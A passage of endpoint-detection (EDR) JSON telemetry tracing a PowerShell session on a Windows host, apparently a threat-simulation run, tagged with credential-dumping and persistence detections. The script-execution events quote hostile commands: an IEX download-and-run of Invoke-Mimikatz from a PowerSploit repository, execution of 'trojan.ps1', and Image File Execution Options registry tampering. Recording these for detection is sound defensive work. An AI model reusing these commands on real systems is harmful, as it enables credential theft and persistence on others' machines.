                "name": "GetLogicalDrives",
                "result": "4",
                "targetPid": 0
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:02.072Z",
            "traceId": "2baddd76-af15-4cb1-a570-cea47d96ba3e",
            "uniqueRuleId": 19120,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "cmdLine": "\"PowerShell.exe\" -noexit -command Set-Location -literalPath 'C:\\Users\\cdaauto\\Desktop\\threatfiles\\threatfiles'",
            "cmdLineMd5": "998ED8589F0F7428EC9662FE8ECD095A",
            "cmdLineSha1": "2C2330B00CC68F57FC192E4A7E7BA549467D66C8",
            "cmdLineSha256": "529CAC371EC5C4CEDB35BD076767936B9D561CA6C926825F55F53CD938F73D31",
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Process Created",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "integrity": 3,
            "interpreter": "powershell",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "nonpeType": "commandline",
            "pFullName": "C:\\Windows\\explorer.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "ac6ec9e0-ef1f-4e0f-a02c-322be750c2b5",
            "parentsTraceId": [
                "ac6ec9e0-ef1f-4e0f-a02c-322be750c2b5"
            ],
            "pid": 9936,
            "ppid": 2436,
            "procFileAttrs": {
                "creationDate": "2024-02-15T10:53:07.593Z",
                "embedFileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
                "embedFilename": "PowerShell.EXE",
                "embedProductName": "Microsoft® Windows® Operating System",
                "embedProductVersion": "10.0.19041.3996",
                "embedVendorName": "Microsoft Corporation",
                "md5": "2E5A8590CF6848968FC23DE3FA1E25F1",
                "name": "powershell.exe",
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "reputation": {
                    "reputation": 99,
                    "vtpPrivileges": 1
                },
                "sha1": "801262E122DB6A2E758962896F260B55BBD0136A",
                "sha256": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
                "size": 455680,
                "subsystem": 3
            },
            "processName": "powershell.exe",
            "rv": 4528,
            "tags": [
                "@AC.AdminHackingToolExecuted",
                "@AC.ProcessCreated"
            ],
            "tdmRuleIds": [
                99,
                100000,
                100007,
                100009
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.466Z",
            "traceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "user": {
                "domain": "CDA",
                "id": "S-1-5-21-2561662139-2012859153-108931552-1137",
                "name": "cdaauto"
            },
            "version": "3.0",
            "severity": "s4",
            "detectionsSets": [
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATA.Execution",
                        "@ATE.T1082",
                        "@ATE.T1059.001",
                        "@MSI._apt_process_PS_env_systeminfo"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.CommandAndControl",
                        "@ATE.T1059.001",
                        "@ATE.T1105",
                        "@ATE.T1071",
                        "@MSI._process_psdownload"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATA.Execution",
                        "@ATE.T1082",
                        "@ATE.T1016",
                        "@ATE.T1059.001",
                        "@ATE.T1047",
                        "@MSI._apt_process_PS_win32_systeminfo"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.LateralMovement",
                        "@ATA.DefenseEvasion",
                        "@ATA.Execution",
                        "@ATE.T1003.001",
                        "@ATE.T1003.002",
                        "@ATE.T1003.003",
                        "@ATE.T1003.004",
                        "@ATE.T1003.005",
                        "@ATE.T1003.006",
                        "@ATE.T1003.007",
                        "@ATE.T1003.008",
                        "@ATE.T1558.001",
                        "@ATE.T1558.002",
                        "@ATE.T1552.001",
                        "@ATE.T1552.002",
                        "@ATE.T1552.004",
                        "@ATE.T1552.006",
                        "@ATE.T1550.002",
                        "@ATE.T1550.003",
                        "@ATE.T1059.001",
                        "@MSI._ps_redteam_credaccess_nishang"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.Execution",
                        "@ATA.Persistence",
                        "@ATA.PrivilegeEscalation",
                        "@ATE.T1003.001",
                        "@ATE.T1053.005",
                        "@ATE.T1059.001",
                        "@MSI._process_schtasks_mimikatz_creddump_via_powershell"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATE.T1059.001",
                        "@MSI._process_psexecexpression"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.CommandAndControl",
                        "@ATA.Execution",
                        "@ATE.T1105",
                        "@ATE.T1059.001",
                        "@MSI._malware_powershell_downloader_low"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATE.T1003.004",
                        "@MSI._process_mimikatz_creddump"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATE.T1059.001",
                        "@ATE.T1047",
                        "@MSI._apt_process_gwmi"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.CredentialAccess",
                        "@ATE.T1059.001",
                        "@ATE.T1003.001",
                        "@MSI._malware_scripting_lsass_memory_read"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.DefenseEvasion",
                        "@ATE.T1059.001",
                        "@ATE.T1027",
                        "@ATE.T1140",
                        "@MSI._process_psobfuscation_frombase64"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.CommandAndControl",
                        "@ATA.Execution",
                        "@ATE.T1102",
                        "@ATE.T1059.001",
                        "@MSI._process_powershell_download_public_repo_pscript"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.PrivilegeEscalation",
                        "@ATA.DefenseEvasion",
                        "@ATA.Execution",
                        "@ATE.T1134.001",
                        "@ATE.T1134.002",
                        "@ATE.T1134.003",
                        "@ATE.T1068",
                        "@ATE.T1059.001",
                        "@MSI._ps_redteam_accesscontrol_nishang"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Collection",
                        "@ATE.T1074.001",
                        "@MSI._process_local_data_staging"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.CommandAndControl",
                        "@ATA.Execution",
                        "@ATE.T1102.003",
                        "@ATE.T1059.001",
                        "@MSI._process_PS_public_repos"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.DefenseEvasion",
                        "@ATA.PrivilegeEscalation",
                        "@ATA.Execution",
                        "@ATA.CredentialAccess",
                        "@ATE.T1134",
                        "@ATE.T1106",
                        "@ATE.T1003.001",
                        "@MSI._api_tokenprivileges_lsass"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.Execution",
                        "@ATE.T1003.004",
                        "@ATE.T1059.001",
                        "@MSI._process_ps_invoke_mimikatz"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATA.Execution",
                        "@ATE.T1033",
                        "@ATE.T1069.001",
                        "@ATE.T1059.001",
                        "@ATE.T1087.001",
                        "@MSI._apt_process_whoami_high_via_powershell"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.DefenseEvasion",
                        "@ATE.T1059.001",
                        "@ATE.T1027",
                        "@MSI._process_psobfuscation_character_tick"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.CredentialAccess",
                        "@ATE.T1003",
                        "@MSI._process_accessed_lsass_high_0x1010"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATA.Execution",
                        "@ATE.T1033",
                        "@ATE.T1059.001",
                        "@ATE.T1087.001",
                        "@MSI._apt_process_PS_Get_userinfo"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.DefenseEvasion",
                        "@ATE.T1059.001",
                        "@ATE.T1027",
                        "@ATE.T1140",
                        "@MSI._process_psobfuscation"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.DefenseEvasion",
                        "@ATA.Persistence",
                        "@ATA.PrivilegeEscalation",
                        "@ATE.T1546.012",
                        "@ATE.T1112",
                        "@MSI._reg_ep0130_imageexecution_high"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATE.T1033",
                        "@MSI._apt_process_whoami_high"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.Execution",
                        "@ATE.T1003.004",
                        "@ATE.T1059.001",
                        "@MSI._process_ps_invoke_mimikatz_script"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATE.T1552.001",
                        "@ATE.T1555.003",
                        "@ATE.T1555.004",
                        "@MSI._process_creds_edge"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.Discovery",
                        "@ATE.T1059.001",
                        "@ATE.T1057",
                        "@MSI._process_ps_get_process"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.LateralMovement",
                        "@ATA.Execution",
                        "@ATE.T1021.006",
                        "@ATE.T1059.001",
                        "@MSI._process_remote_invoke_command"
                    ]
                }
            ],
            "endTime": null,
            "originalSeverity": "s4",
            "processCharacteristics": "",
            "contained": "no",
            "flagged": false,
            "containedBy": "",
            "summary": [
                {
                    "attribute": "cmdline",
                    "attributeKey": "cmdLine",
                    "label": "TRACE_TIMELINE.DETAILS.CMD_LINE",
                    "summarizable": true,
                    "shouldDisplayReadMore": true,
                    "shouldDisplayCopyToClipboard": true
                },
                {
                    "attribute": "domainName",
                    "attributeKey": "user.domain",
                    "label": "TRACE_TIMELINE.DETAILS.DOMAIN_NAME",
                    "summarizable": true
                },
                {
                    "attribute": "user",
                    "attributeKey": "user.name",
                    "label": "TRACE_TIMELINE.DETAILS.USER",
                    "links": [
                        {
                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ONE",
                            "searchTarget": [
                                "${maGuid}"
                            ],
                            "searchHostname": [
                                "${hostname}"
                            ],
                            "drillDownKey": "PROCESS_USER_ONE",
                            "searchQuery": {
                                "projections": [
                                    {
                                        "name": "Processes",
                                        "outputs": [
                                            "id",
                                            "name",
                                            "cmdline",
                                            "parentid",
                                            "parentname",
                                            "sha1",
                                            "md5",
                                            "user"
                                        ]
                                    }
                                ],
                                "condition": {
                                    "or": [
                                        {
                                            "and": [
                                                {
                                                    "name": "Processes",
                                                    "output": "user",
                                                    "op": "ENDS_WITH",
                                                    "value": "${user}"
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.PROCESS_USER_ALL",
                            "searchQuery": {
                                "projections": [
                                    {
                                        "name": "HostInfo",
                                        "outputs": [
                                            "hostname",
                                            "ip_address"
                                        ]
                                    },
                                    {
                                        "name": "Processes",
                                        "outputs": [
                                            "id",
                                            "name",
                                            "cmdline",
                                            "parentid",
                                            "parentname",
                                            "sha1",
                                            "md5",
                                            "user"
                                        ]
                                    }
                                ],
                                "condition": {
                                    "or": [
                                        {
                                            "and": [
                                                {
                                                    "name": "Processes",
                                                    "output": "user",
                                                    "op": "ENDS_WITH",
                                                    "value": "${user}"
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        },
                        {
                            "label": "TRACE_TIMELINE.DRILL_DOWN_LINKS.LOGGED_USER_ALL",
                            "searchQuery": {
                                "projections": [
                                    {
                                        "name": "HostInfo",
                                        "outputs": [
                                            "hostname",
                                            "ip_address"
                                        ]
                                    },
                                    {
                                        "name": "LoggedInUsers"
                                    }
                                ],
                                "condition": {
                                    "or": [
                                        {
                                            "and": [
                                                {
                                                    "name": "LoggedInUsers",
                                                    "output": "username",
                                                    "op": "EQUALS",
                                                    "value": "${user}"
                                                }
                                            ]
                                        }
                                    ]
                                }
                            }
                        }
                    ],
                    "summarizable": true
                }
            ],
            "pidTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "lastActivityTime": "2024-08-01T15:54:16.325Z",
            "reputationInfo": {
                "reason": ""
            }
        },
        {
            "api": {
                "arguments": [
                    "0x160e24bddb0",
                    "0x6",
                    "0x0"
                ],
                "moduleName": "",
                "name": "CryptExportKey",
                "result": "1",
                "targetPid": 9936,
                "targetProcessFull": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.916Z",
            "traceId": "b355498b-d85e-432d-b73f-958849fcb5d1",
            "uniqueRuleId": 19117,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Network Accessed",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "network": {
                "accessType": "connection_opened",
                "direction": "outbound",
                "dnsNames": [
                    "proxy.ess.gslb.entsec.com",
                    "us-lvs-essmwg1.corp.entsec.com"
                ],
                "dstIp": "10.194.0.190",
                "dstPort": 9090,
                "protocol": "tcp",
                "srcIp": "10.26.23.233",
                "srcPort": 53378
            },
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NetworkConnection"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:16.325Z",
            "traceId": "90f273b6-45e4-4e49-bd01-7bb9c7a06d0a",
            "uniqueRuleId": 19101,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Image Loaded",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "modules": [
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:01.758Z",
                    "name": "C:\\Windows\\System32\\bcrypt.dll",
                    "sha256": "5D05DB7DB46D509FF71B7A952FD36D3A9E432F1E8E26FA0A5772F3D260146E81",
                    "vtpPrivileges": 1
                },
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:01.992Z",
                    "name": "C:\\Windows\\System32\\ws2_32.dll",
                    "sha256": "5E9857A80A301AD21D0E0A0928A4FF2B5360C305A97BFC88886E3B686BF8D503",
                    "vtpPrivileges": 1
                }
            ],
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.LoadedDLLs"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.758Z",
            "traceId": "ff7359a3-5865-4c88-ad2f-da661ba33910",
            "uniqueRuleId": 18,
            "version": "3.0"
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "RegValue Modified",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "registry": {
                "keyName": "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\IMAGE FILE EXECUTION OPTIONS",
                "keyOldValue": "483457",
                "keyValue": "288705",
                "keyValueName": "BREAKONDLLLOAD",
                "keyValueType": "REG_DWORD"
            },
            "ruleTags": [
                "aseps"
            ],
            "rv": 4528,
            "tags": [
                "@AC.ASEPCreatedOrModified"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:06.420Z",
            "traceId": "68381dff-83c1-4b66-96c3-4a524c68a439",
            "uniqueRuleId": 8,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Moved",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:48:27.822Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:48:27.822Z",
                "md5": "132C53EDB02DFDD83C38CC67F91AA9EF",
                "mhdr": "0200000001000000",
                "name": "590aee7bdd69b59b.customDestinations-ms",
                "newFilePath": "C:\\Users\\cdaauto\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\590aee7bdd69b59b.customDestinations-ms~RF6c3ec40.TMP",
                "path": "C:\\Users\\cdaauto\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\590aee7bdd69b59b.customDestinations-ms",
                "sha1": "37504C974176C1F29FA38385267D9FA176A080CB",
                "sha256": "37B287BFD96F44A051984E90EEF0C5DF4B8514248FD6FCF8D5B253849C7486C5",
                "size": 6229
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NonPECreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.874Z",
            "traceId": "9a6de2d1-41e7-4b0e-8c2e-63f79a664068",
            "uniqueRuleId": 21,
            "version": "3.0"
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Created",
            "fileAttributes": {
                "fsattrs": 32,
                "md5": "",
                "name": "0H8N2X9KA7RPIART73T2.temp",
                "path": "C:\\Users\\cdaauto\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\0H8N2X9KA7RPIART73T2.temp",
                "sha1": "",
                "sha256": "",
                "size": 6229
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NonPECreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.871Z",
            "traceId": "c8342a7a-fa67-42c4-b00b-f77a94c742d8",
            "uniqueRuleId": 21,
            "version": "3.0",
            "severity": "s0",
            "detectionsSets": [
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Collection",
                        "@ATE.T1074.001",
                        "@MSI._process_local_data_staging"
                    ]
                }
            ],
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "RegValue Modified",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "registry": {
                "keyName": "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\IMAGE FILE EXECUTION OPTIONS",
                "keyOldValue": "483457",
                "keyValue": "288705",
                "keyValueName": "DEBUGGER",
                "keyValueType": "REG_DWORD"
            },
            "ruleTags": [
                "aseps"
            ],
            "rv": 4528,
            "tags": [
                "@AC.ASEPCreatedOrModified"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:08.420Z",
            "traceId": "b6252722-e2a4-4416-8f5c-e552dd2ceaeb",
            "uniqueRuleId": 8,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Read",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:54:01.962Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:54:01.962Z",
                "md5": "D17FE0A3F47BE24A6453E9EF58C94641",
                "mhdr": "2320506f77657253",
                "name": "__PSScriptPolicyTest_fift2gbs.szm.ps1",
                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fift2gbs.szm.ps1",
                "sha1": "6AB83620379FC69F80C0242105DDFFD7D98D5D9D",
                "sha256": "96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7",
                "size": 60
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.ScriptCreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.974Z",
            "traceId": "0bb82345-26ae-48da-b0c8-aae0a342b0dc",
            "uniqueRuleId": 5,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:58Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Script Executed",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "scriptType": "powershell",
            "scripts": [
                {
                    "hash": "18728F3F55FD2FDB25CD048D8C2487A1187481EF9BACB5E9DCA65631FE139A40",
                    "intentions": [
                        {
                            "lines": [
                                "Set-Location -literalPath 'C:\\Users\\cdaauto\\Desktop\\threatfiles\\threatfiles'"
                            ],
                            "name": "action:Variable/Set"
                        },
                        {
                            "lines": [
                                "Set-Location -literalPath 'C:\\Users\\cdaauto\\Desktop\\threatfiles\\threatfiles'"
                            ],
                            "name": "observable:path.file"
                        }
                    ],
                    "length": 76,
                    "timestamp": "2024-08-01T15:54:02.237Z"
                },
                {
                    "hash": "979ACEFCD3B816B528718EB4F3424730B907D987E71192649E88838583E759F5",
                    "intentions": [
                        {
                            "lines": [
                                ".\\trojan.ps1"
                            ],
                            "name": "observable:file.script.powershell"
                        }
                    ],
                    "length": 12,
                    "timestamp": "2024-08-01T15:54:04.363Z"
                },
                {
                    "hash": "30D1B4AA74E8D2171E3A1CE6277881D578B8752111BC1FE853E67E7C1106797E",
                    "intentions": [
                        {
                            "lines": [
                                "(New-Object System.Net.WebClient).DownloadString(\"http://google.com\")",
                                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nciappo/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
                            ],
                            "name": "action:DotNet.Net.Web/Use"
                        },
                        {
                            "lines": [
                                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nciappo/PowerSploit/master/Exfiltration/Invoke-Mim[...]"
                            ],
                            "name": "action:Expression/Invoke"
                        },
                        {
                            "lines": [
                                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'BREAKONDLLLOAD' -Value $random -[...]",
                                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'DEBUGGER' -Value $random -Force",
                                "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'BREAKONDLLLOAD' -Value $random -[...]",
                                "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -Name 'DEBUGGER' -Value $random -Force"
                            ],
                            "name": "action:Item.Property/Set"
                        },
                        {
                            "lines": [
                                "New-Item 'HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -erroraction 'silentlycontinue'",
                                "New-Item 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' -erroraction 'silentlycontinue'"
                            ],
                            "name": "action:Item/New"
                        },
                        {
                            "lines": [
                                "(New-Object System.Net.WebClient).DownloadString(\"http://google.com\")",
